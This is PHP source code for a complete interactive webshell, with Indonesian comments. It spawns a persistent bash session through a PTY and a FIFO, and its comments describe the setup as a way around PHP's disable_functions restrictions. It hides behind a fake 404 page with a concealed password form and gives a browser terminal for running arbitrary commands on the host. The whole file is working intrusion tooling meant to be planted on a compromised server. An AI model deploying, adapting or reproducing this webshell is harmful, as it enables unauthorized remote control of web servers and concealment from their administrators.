<?php
/*
 * interactiveshell.php — persistent TTY-like webshell (PHP 5.2+)
 *
 * Bukan one-shot exec: men-spawn SATU proses `script -qfec "bash --norc -i"`
 * lewat PTY, berkomunikasi via FIFO + logfile di /dev/shm atau /tmp.
 * disable_functions tetap ter-bypass karena exec dipakai SEKALI saat spawn;
 * interaksi selanjutnya murni file I/O (fopen/fwrite/fread) yang tidak
 * bisa di-disable oleh php.ini.
 *
 * cd persist, prompt asli (user@host:path$), Ctrl+C (\x03), Ctrl+D (\x04).
 * Password default: 0xdeadbeef  (GANTI)
 */

$PASS = '0xdeadbeef';

/* ---------- disable_functions map ---------- */
$DIS = array();
$_d = @ini_get('disable_functions');
if ($_d) { foreach (explode(',', $_d) as $_f) $DIS[] = trim($_f); }
function DF($fn) { global $DIS; return function_exists($fn) && !in_array($fn, $DIS); }

/* ---------- exec router (spawn-only, once) ---------- */
function XRUN($cmd) {
    if (DF('proc_open')) {
        $p = @proc_open($cmd, array(), $pipes);
        if (is_resource($p)) { @proc_close($p); return 'proc_open'; }
    }
    if (DF('exec'))       { @exec($cmd);       return 'exec'; }
    if (DF('system'))     { @system($cmd);     return 'system'; }
    if (DF('shell_exec')) { @shell_exec($cmd); return 'shell_exec'; }
    if (DF('passthru'))   { @passthru($cmd);   return 'passthru'; }
    if (DF('popen'))      { $h=@popen($cmd,'r'); if($h){@pclose($h); return 'popen';} }
    return false;
}

/* ---------- writable dir picker ---------- */
function pick_dir($sid) {
    $c = array();
    if (is_dir('/dev/shm'))            $c[] = '/dev/shm';
    if (is_dir('/tmp'))                $c[] = '/tmp';
    $t = @sys_get_temp_dir(); if ($t)  $c[] = $t;
    $s = @session_save_path(); if ($s) $c[] = $s;
    $c[] = getcwd();
    foreach ($c as $d) {
        $probe = $d . '/.p' . $sid;
        if (@file_put_contents($probe, 'x') !== false) { @unlink($probe); return $d; }
    }
    return false;
}

/* ---------- session & auth ---------- */
@session_start();
$SID = substr(md5(session_id()), 0, 10);

if (isset($_GET['logout'])) {
    @session_destroy();
    header('Location: ?');
    exit;
}
if (isset($_REQUEST['pass']) && $_REQUEST['pass'] === $PASS) $_SESSION['ok'] = 1;
if (empty($_SESSION['ok'])) {
    header('HTTP/1.0 404 Not Found');
    ?><html><head><title>404 Not Found</title></head><body>
<h1>Not Found</h1><p>The requested URL was not found on this server.</p><hr>
<form method="post" style="display:none"><input name="pass"></form>
</body></html><?php
    exit;
}

/* ---------- per-session filemap ---------- */
$BASE = pick_dir($SID);
$FIFO = $BASE . '/.f_' . $SID;
$LOG  = $BASE . '/.l_' . $SID;
$LCH  = $BASE . '/.c_' . $SID . '.sh';

function sh_clean($d) {
    // ANSI CSI
    $d = preg_replace("/\x1b\[[0-9;?]*[ -\/]*[@-~]/", '', $d);
    // OSC
    $d = preg_replace("/\x1b\][^\x07\x1b]*(\x07|\x1b\\\\)/", '', $d);
    // other esc
    $d = preg_replace("/\x1b[@-Z\\\\-_]/", '', $d);
    $d = str_replace("\x07", '', $d);
    // line endings (prompt redraw pakai \r)
    $d = str_replace("\r\n", "\n", $d);
    $d = str_replace("\r", "\n", $d);
    // backspace resolution
    $g = 0;
    while (strpos($d, "\x08") !== false && $g++ < 2000) {
        $d = preg_replace("/[^\x08]?\x08/", '', $d);
    }
    return $d;
}

function sh_alive($fifo, $log) {
    if (DF('exec')) {
        @exec('fuser ' . escapeshellarg($fifo) . ' 2>/dev/null', $o);
        if (count($o) && trim(implode('', $o)) !== '') return true;
    }
    // fallback: ada proses script/bash dengan nama file kita di cmdline
    if (DF('exec')) {
        @exec("ps -eo args 2>/dev/null | grep -F " . escapeshellarg($fifo) . " | grep -v grep", $p);
        if (count($p)) return true;
    }
    // last resort: fifo masih ada & log berubah < 300s
    return file_exists($fifo) && file_exists($log) && (time() - @filemtime($log) < 300);
}

function sh_spawn($fifo, $log, $lch) {
    $py = "python -c 'import pty;pty.spawn(\"/bin/bash\")' 2>/dev/null";
    $sh = "#!/bin/sh\nF=\"$1\";L=\"$2\"\nrm -f \"$L\"\nmkfifo \"$F\" 2>/dev/null\n"
        . "if command -v script >/dev/null 2>&1; then\n"
        . "  setsid script -qfec 'bash --norc -i' /dev/null < \"$F\" > \"$L\" 2>&1 &\n"
        . "else\n"
        . "  setsid sh -c 'tail -f \"$0\" | bash --norc -i > \"$1\" 2>&1' \"$F\" \"$L\" &\n"
        . "fi\n";
    @file_put_contents($lch, $sh);
    @chmod($lch, 0700);
    $cmd = 'setsid sh ' . escapeshellarg($lch) . ' ' . escapeshellarg($fifo) . ' ' . escapeshellarg($log) . ' >/dev/null 2>&1 </dev/null &';
    return XRUN($cmd);
}

function sh_kill($fifo, $log, $lch) {
    if (DF('exec')) {
        @exec('fuser -k ' . escapeshellarg($fifo) . ' ' . escapeshellarg($log) . ' 2>/dev/null');
        @exec('pkill -f ' . escapeshellarg('.f_' . substr(basename($fifo), -10)) . ' 2>/dev/null');
    }
    @unlink($fifo); @unlink($log); @unlink($lch);
}

/* ---------- AJAX API ---------- */
if (isset($_REQUEST['a'])) {
    header('Content-Type: application/json');
    $a = $_REQUEST['a'];
    $R = array('ok' => 1);

    if ($a === 'status') {
        $R['dir']    = $BASE;
        $R['alive']  = $BASE && sh_alive($FIFO, $LOG);
        $R['df']     = @ini_get('disable_functions');
        $R['php']    = PHP_VERSION;
        $R['user']   = @get_current_user();
        $R['os']     = PHP_OS;
    }
    elseif ($a === 'start') {
        if (!$BASE) { $R = array('ok' => 0, 'err' => 'no writable dir'); }
        elseif (!sh_alive($FIFO, $LOG)) {
            $m = sh_spawn($FIFO, $LOG, $LCH);
            if (!$m) { $R = array('ok' => 0, 'err' => 'all exec funcs disabled'); }
            else {
                usleep(400000);
                $_SESSION['pos'] = 0;
                $R['via'] = $m;
                $R['alive'] = sh_alive($FIFO, $LOG);
            }
        } else { $R['alive'] = true; $R['via'] = 'reuse'; }
    }
    elseif ($a === 'cmd') {
        $c = isset($_REQUEST['c']) ? $_REQUEST['c'] : '';
        $seq = isset($_SESSION['seq']) ? $_SESSION['seq'] + 1 : 1;
        $_SESSION['seq'] = $seq;
        $mk = '__X' . substr(md5($SID), 0, 6) . '_' . $seq . '__$?';
        $fh = @fopen($FIFO, 'w');
        if (!$fh) { $R = array('ok' => 0, 'err' => 'fifo dead'); }
        else {
            @fwrite($fh, $c . "\n" . 'echo ' . $mk . "\n");
            @fclose($fh);
        }
    }
    elseif ($a === 'sig') {
        $k = isset($_REQUEST['k']) ? $_REQUEST['k'] : '';
        $ch = ($k === 'int') ? "\x03" : (($k === 'eof') ? "\x04" : (($k === 'susp') ? "\x1a" : ''));
        if ($ch !== '') {
            $fh = @fopen($FIFO, 'w');
            if ($fh) { @fwrite($fh, $ch); @fclose($fh); }
        }
    }
    elseif ($a === 'poll') {
        $pos = isset($_SESSION['pos']) ? intval($_SESSION['pos']) : 0;
        $sz = file_exists($LOG) ? @filesize($LOG) : 0;
        if ($sz === false) $sz = 0;
        if ($sz < $pos) $pos = 0;               // log rotated/recreated
        $out = '';
        if ($sz > $pos) {
            $fh = @fopen($LOG, 'r');
            if ($fh) {
                @fseek($fh, $pos);
                $out = @fread($fh, min($sz - $pos, 256 * 1024));
                $pos = @ftell($fh);
                @fclose($fh);
            }
        }
        $_SESSION['pos'] = $pos;
        $out = sh_clean($out);
        // buang echo baris marker-command
        $out = preg_replace('/^[^\n]*echo __X' . substr(md5($SID), 0, 6) . '_\d+__\$\?[^\n]*\n/m', '', $out);
        // marker -> badge exit code (sembunyikan kalau 0)
        $out = preg_replace('/\n?__X' . substr(md5($SID), 0, 6) . '_\d+__(\d{1,3})\n?/', "\n[[E:$1]]\n", $out);
        $R['alive'] = sh_alive($FIFO, $LOG);
        if ($out !== '') $R['out'] = $out;
    }
    elseif ($a === 'stop') {
        sh_kill($FIFO, $LOG, $LCH);
        $_SESSION['pos'] = 0;
        $R['alive'] = false;
    }
    echo json_encode($R);
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>tty</title>
<style>
  html,body{height:100%;margin:0;background:#0d1117;color:#c9d1d9;font:13px/1.45 "Consolas","DejaVu Sans Mono",monospace}
  #bar{background:#161b22;padding:6px 10px;border-bottom:1px solid #30363d;display:flex;gap:8px;align-items:center;flex-wrap:wrap}
  #bar b{color:#58a6ff}
  .dot{width:9px;height:9px;border-radius:50%;background:#f85149;display:inline-block}
  .dot.on{background:#3fb950}
  #bar span{color:#8b949e}
  button{background:#21262d;color:#c9d1d9;border:1px solid #30363d;border-radius:4px;padding:3px 10px;font:inherit;cursor:pointer}
  button:hover{background:#30363d}
  #scr{position:absolute;top:38px;bottom:34px;left:0;right:0;overflow-y:auto;padding:8px 10px;white-space:pre-wrap;word-break:break-all;cursor:text}
  #cmd{position:absolute;bottom:0;left:0;right:0;background:#161b22;border:0;border-top:1px solid #30363d;color:#c9d1d9;padding:8px 10px;font:inherit;outline:none}
  .ec{color:#f85149}
  a{color:#58a6ff;font-size:11px}
</style>
</head>
<body>
<div id="bar">
  <span class="dot" id="dot"></span><b>tty-shell</b>
  <span id="meta">…</span>
  <button onclick="send('')">Enter</button>
  <button onclick="sig('int')">^C</button>
  <button onclick="sig('eof')">^D</button>
  <button onclick="sig('susp')">^Z</button>
  <button onclick="clr()">clear</button>
  <button onclick="restart()">restart</button>
  <button onclick="stop()">kill</button>
  <a href="?logout=1">logout</a>
</div>
<div id="scr" onclick="document.getElementById('cmd').focus()"></div>
<input id="cmd" autocomplete="off" spellcheck="false" autofocus>

<script>
var scr=document.getElementById('scr'), cmd=document.getElementById('cmd'),
    dot=document.getElementById('dot'), meta=document.getElementById('meta'),
    hist=[], hi=0, dead=false, timer=null;

function esc(s){return s.replace(/&/g,'&amp;').replace(/</g,'&lt;')}
function append(out){
  // badge exit code dari server: [[E:N]]
  out=esc(out).replace(/\[\[E:(\d+)\]\]/g,function(m,n){
    return n==='0'?'':'<span class="ec">[exit '+n+']</span>';
  });
  scr.insertAdjacentHTML('beforeend',out);
  scr.scrollTop=scr.scrollHeight;
}
function api(q,cb,body){
  var x=new XMLHttpRequest();
  x.open('POST','?a='+q,true);
  x.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
  x.onreadystatechange=function(){
    if(x.readyState===4){
      try{cb(JSON.parse(x.responseText))}catch(e){schedule()}
    }
  };
  x.send(body||'');
}
function schedule(){timer=setTimeout(poll, dead?1500:400)}
function poll(){
  api('poll',function(r){
    if(r.out)append(r.out);
    var alive=!!r.alive;
    if(alive!==!dead){dead=!alive;dot.className='dot'+(alive?' on':'');}
    schedule();
  });
}
function send(v){
  if(v===undefined)v=cmd.value;
  if(v){hist.push(v);hi=hist.length;}
  cmd.value='';
  api('cmd',function(r){if(!r.ok)append('[!] '+(r.err||'dead')+'\n');},'c='+encodeURIComponent(v));
}
function sig(k){api('sig',function(){},'k='+k);}
function clr(){scr.innerHTML='';}
function stop(){api('stop',function(r){append('\n[killed]\n');dead=true;schedule();});}
function restart(){append('\n[respawning…]\n');api('stop',function(){api('start',function(r){if(!r.ok)append('[!] '+(r.err||'')+'\n');setTimeout(poll,300);});});}

cmd.addEventListener('keydown',function(e){
  if(e.key==='Enter'){e.preventDefault();send();}
  else if(e.key==='ArrowUp'){e.preventDefault();if(hi>0)cmd.value=hist[--hi]||'';}
  else if(e.key==='ArrowDown'){e.preventDefault();if(hi<hist.length)cmd.value=hist[++hi]||'';}
  else if(e.key==='l'&&e.ctrlKey){e.preventDefault();clr();}
  else if(e.key==='c'&&e.ctrlKey&&!window.getSelection().toString()){e.preventDefault();sig('int');}
});

api('status',function(s){
  meta.textContent=(s.user||'?')+' | php '+s.php+' | '+s.os+' | base '+s.dir+(s.df?' | df: '+s.df:'');
});
api('start',function(r){
  if(!r.ok){append('[spawn failed] '+(r.err||'')+'\n');return;}
  append('[pty up via '+r.via+'] — bash --norc -i\n');
  setTimeout(poll,250);
});
schedule();
</script>
</body>
</html>
